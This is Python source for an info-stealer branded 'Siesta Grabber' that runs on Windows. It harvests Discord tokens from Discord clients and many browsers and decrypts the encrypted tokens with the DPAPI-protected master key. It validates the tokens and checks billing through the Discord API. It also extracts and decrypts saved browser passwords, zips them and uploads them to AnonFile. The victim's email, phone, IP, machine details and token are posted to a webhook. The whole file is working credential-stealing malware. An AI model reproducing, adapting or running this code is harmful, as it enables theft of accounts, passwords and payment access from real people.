import os
import re
import json
import base64
import sqlite3
import shutil
import requests
import win32crypt
from Crypto.Cipher import AES
from anonfile import AnonFile



webhook = "webhook"

if os.name != "nt": os._exit()

alr = []
local = os.getenv("localappdata")
roaming = os.getenv("appdata")
temp = os.getenv("temp")
regex = "dQw4w9WgXcQ:[^\"]*"

if not os.path.exists(temp + "/Siesta"): os.mkdir(temp + "/Siesta")

class Siesta:
    def sendZip():
        upload = AnonFile().upload(temp + "/Siesta.zip", progressbar=False)
        return (upload.url.geturl())
    def decrypt(content, key):
        try:
            uncrypt = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            aes = AES.new(uncrypt, AES.MODE_GCM, content[3:15])
            return aes.decrypt(content[15:])[:-16].decode()

        except:
            return False

    def getMainKey(path):
        try:
            with open(path + f"/Local State", "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
                file.close()
                key = base64.b64decode(key)[5:]
                return key
        except Exception: 
            return False

    def TestToken(token):
        if token == False: return False
        json = requests.get("https://discord.com/api/v9/users/@me", headers= { "authorization": token}).json()
        if not "message" in json: return json
        else: return False

    def getBilling(token):
        json = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers= { "authorization": token}).json()
        if not "message" in json: return len(json)
        else: return False
    def getIP():
        json = requests.get("http://ip-api.com/json/").json()
        return json["query"]
    def Main():
        Siesta.getPasswords()
        AnonFile = Siesta.sendZip()
        paths = Siesta.getPaths()
        tokens = []
        real = []
        for platform, path in paths.items(): 
            if not os.path.exists(path): continue
            if "Discord" in platform:
                masterKey = Siesta.getMainKey(path)
            for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        files = open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore')
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(regex, x): tokens.append(values)
                    except: 
                        False
            else:
                for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
                    if not file.endswith(".ldb") and file.endswith(".log"): continue
                    else:
                        try:
                            files = open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore')
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall("[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}", x): tokens.append(values)
                        except: 
                            False
            for n in tokens:
                if "dQw4w9WgXcQ:" in n:
                    n = n.split('dQw4w9WgXcQ:')[1]
                    n = base64.b64decode(n)
                    n = Siesta.decrypt(n, masterKey)
                TestedToken = Siesta.TestToken(n)
                if TestedToken is not False:
                    TestedToken["token"] = n
                    real.append(TestedToken)
            for Token in real:
                Billing = Siesta.getBilling(Token["token"])
                embed = Siesta.getEmbed(Token)
                embed[0]["fields"] = [
                    {
                        "name": "**Discord Info**",
                        "value": f'Email: {Token["email"]}\nPhone: {Token["phone"] if Token["phone"] else "None"}\nNitro: {"None" if Token["premium_type"] == 0 else "Nitro"}\nBilling: {"None" if Billing == 0 else Billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {Siesta.getIP()}\nUsername: {os.getenv("username")}\nPC Name: {os.getenv("USERDOMAIN")}\nToken Location: {platform}\n[Browsers Passwords]({AnonFile})',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": Token["token"],
                        "inline": False
                    }]
                Siesta.sendEmbed(embed)
        return
    def getPaths():
        return {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'LightCord': roaming + '\\lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    def getEmbed(type):
        avatar = ""
        if type["avatar"]: 
            avatar = f"https://cdn.discordapp.com/avatars/{type['id']}/{type['avatar']}.png" 
        else: "None"
        return [{
            "image": {
                "url": "https://imgs.search.brave.com/5S3SVIftqkjVZlj14mWsWd_BNXlYk4ebqxpHHn5ig9Y/rs:fit:1200:1080:1/g:ce/aHR0cHM6Ly93YWxs/cGFwZXJjYXZlLmNv/bS93cC93cDk3MDQ2/MzkucG5n"
            },
            "color": 43690,
            "fields": [],
            "author": {
                "name": f"{type['username']} ({type['id']}) - Siesta Grabber",
                "icon_url": avatar
            },
            "footer": {
                "text": f"Siesta Grabber - !\"Dialz_†#0069"
            }
        }]
        
    def sendEmbed(embed):
        data = {
            "embeds": embed
        }
        requests.post(webhook, json=data)

    def getPasswords():
        paths = {
            "Brave": f"{local}/BraveSoftware/Brave-Browser/User Data",
            "Chrome": f"{local}/Google/Chrome/User Data",
            "Edge": f"{local}/Microsoft/Edge/User Data",
            "Opera": f"{roaming}/Opera Software/Opera Stable",
            "OperaGX": f"{roaming}/Opera Software/Opera GX Stable"
        }
        fileContent = "------------------------------ Siesta Grabber ------------------------------\n\n"
        for p, path in paths.items():
            if not os.path.exists(path): return
            key = Siesta.getMainKey(path)
            path = path + "/Default/Login Data"
            shutil.copy(path, temp + "/password.db")
            conn = sqlite3.connect(f"{temp}/password.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    ePass = r[2]
                    password = Siesta.decrypt(ePass, key)
                    if username != "" or password != "":
                        fileContent += p + "\n------------------------------\nWebSite: " + url + "\nUsername: " + username + "\nPassword: " + password + "\n------------------------------\n\n"
            except Exception:
                pass
            with open(temp + "/Siesta/passwords.txt", "w") as f:
                f.write(fileContent)
                f.close()
            cursor.close()
            shutil.make_archive(temp + "/Siesta", format='zip', root_dir= temp + "/Siesta")
        return True
if __name__ == "__main__": Siesta.Main()
